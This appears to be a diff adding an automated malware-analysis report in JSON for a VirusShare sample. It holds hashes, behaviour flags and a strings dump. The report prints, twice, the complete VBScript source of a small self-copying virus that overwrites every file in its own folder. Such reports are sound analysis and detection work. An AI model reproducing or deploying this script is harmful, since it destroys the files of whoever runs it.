@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "Dim SmaLL, WshShell, FSO, VX\nOn Error Resume Next\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = Wscript.CreateObject(\"Wscript.Shell\")\nSmaLL = Wscript.ScriptFullName\nVX = Left(SmaLL, InStrRev(SmaLL, \"\\\"))\nFor Each target in FSO.GetFolder(VX).Files\n  FSO.CopyFile SmaLL, target.Name, 1\nNext"
+    },
+    "filename": "VirusShare_48ab5d03941e998d1301b5f4fcbbc346",
+    "filesize": 318,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "48ab5d03941e998d1301b5f4fcbbc346",
+        "sha1": "f09d8cf97152675521f91864fdb15a6b944dd4da",
+        "sha256": "9b271787cb6d3fc657c2559ebcd525ba4c8ec26ee344ee8145ef973f3e106bbe"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim SmaLL, WshShell, FSO, VX",
+            "On Error Resume Next",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
+            "SmaLL = Wscript.ScriptFullName",
+            "VX = Left(SmaLL, InStrRev(SmaLL, \"\\\"))",
+            "For Each target in FSO.GetFolder(VX).Files",
+            "  FSO.CopyFile SmaLL, target.Name, 1",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.276943",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
